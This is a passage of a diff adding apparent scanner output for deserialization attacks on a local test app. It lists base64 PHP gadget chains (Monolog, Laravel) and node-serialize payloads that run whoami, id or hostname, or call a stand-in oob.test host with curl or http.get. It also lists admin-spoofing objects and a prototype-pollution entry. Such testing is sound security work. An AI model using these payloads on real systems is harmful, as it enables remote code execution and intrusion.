+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2M5ZWIwMWFlMzExMy5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2M5ZWIwMWFlMzExMy5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2M5ZWIwMWFlMzExMy5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJwYXNzdGhydSI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjM0OiJjdXJsIGh0dHA6Ly9jOWViMDFhZTMxMTMub29iLnRlc3QvIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czozNDoiY3VybCBodHRwOi8vYzllYjAxYWUzMTEzLm9vYi50ZXN0LyI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6MzQ6ImN1cmwgaHR0cDovL2M5ZWIwMWFlMzExMy5vb2IudGVzdC8iO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/api/import",
+      "method": "POST",
+      "location": "raw_body",
+      "name": "payload",
+      "occurrences": 1,
+      "oob_token": "839b88a51b39",
+      "type": "NodeJS",
+      "subtype": "node-serialize RCE",
+      "confidence": "High",
+      "exploit_type": "node-serialize RCE",
+      "suggested_probe": "node_serialize",
+      "severity": "Critical",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "node-serialize RCE pattern detected | Inject: {\"x\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
+      "normalized": [
+        "_$$ND_FUNC$$_function () { return 1; }"
+      ],
+      "mutations_count": 4,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "node_serialize_rce",
+          "chain": "node-serialize IIFE",
+          "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('id');}()",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "node_serialize_rce",
+          "chain": "node-serialize IIFE",
+          "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "node_serialize_rce",
+          "chain": "node-serialize IIFE",
+          "payload": "_$$ND_FUNC$$_function(){require('child_process').exec('hostname');}()",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "node_serialize_oob",
+          "chain": "node-serialize IIFE: http.get",
+          "payload": "_$$ND_FUNC$$_function(){require('http').get('http://839b88a51b39.oob.test/');}()",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/api/import-config",
+      "method": "POST",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": "c5a7851fc041",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 18,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2M1YTc4NTFmYzA0MS5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2M1YTc4NTFmYzA0MS5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2M1YTc4NTFmYzA0MS5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJwYXNzdGhydSI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjM0OiJjdXJsIGh0dHA6Ly9jNWE3ODUxZmMwNDEub29iLnRlc3QvIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czozNDoiY3VybCBodHRwOi8vYzVhNzg1MWZjMDQxLm9vYi50ZXN0LyI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6MzQ6ImN1cmwgaHR0cDovL2M1YTc4NTFmYzA0MS5vb2IudGVzdC8iO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/api/import-config",
+      "method": "POST",
+      "location": "raw_body",
+      "name": "payload",
+      "occurrences": 1,
+      "oob_token": "945c6b9e8167",
+      "type": "NodeJS",
+      "subtype": "Prototype Pollution",
+      "confidence": "Medium",
+      "exploit_type": "Prototype Pollution",
+      "suggested_probe": "proto_pollution",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "__proto__ detected — try polluting Object.prototype",
+      "normalized": [
+        "{\"theme\":\"dark\",\"lang\":\"en\",\"__proto__\":{\"note\":\"demo\"}}"
+      ],
+      "mutations_count": 1,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "prototype_pollution",
+          "chain": "__proto__ injection",
